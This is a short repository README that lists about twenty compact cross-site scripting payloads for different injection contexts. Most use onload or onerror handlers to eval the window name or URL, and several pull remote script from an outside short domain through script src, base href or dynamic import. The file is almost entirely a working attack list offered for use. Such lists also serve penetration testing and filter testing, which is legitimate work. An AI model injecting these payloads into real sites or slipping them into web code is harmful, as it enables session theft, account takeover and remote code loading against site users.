# Tiny-XSS-Payloads
A collection of short XSS payloads that can be used in different contexts.


```html
<base/href=//Ǌ.₨>
<svg/onload=eval(name)>
<style/onload=eval(name)>
<style/onload=write(URL)>
<iframe/onload=write(URL)>
<style/onerror=eval(name)>
<svg/onload=eval(`'`+URL)>
<svg/onload=location=name>
<script/src=//Ǌ.₨></script>
<iframe/onload=src=top.name>
<style/onload=eval(`'`+URL)>
<svg/onload=import(/\\Ǌ.₨/)>
<svg><svg/onload=eval(name)>
<iframe/onload=eval(`'`+URL)>
<audio/src/onerror=eval(name)>
<style/onload=import(/\\Ǌ.₨/)>
<iframe/onload=import(/\\Ǌ.₨/)>
<img/src/onerror=eval(`'`+URL)>
<iframe/onload=src=top[0].name+/\Ǌ.₨?/>
<iframe/srcdoc="<svg><script/href=//Ǌ.₨ />">
<iframe/srcdoc="<script/src=//Ǌ.₨></script>">
<iframe/onload=src=contentWindow.name+/\Ǌ.₨?/>
```
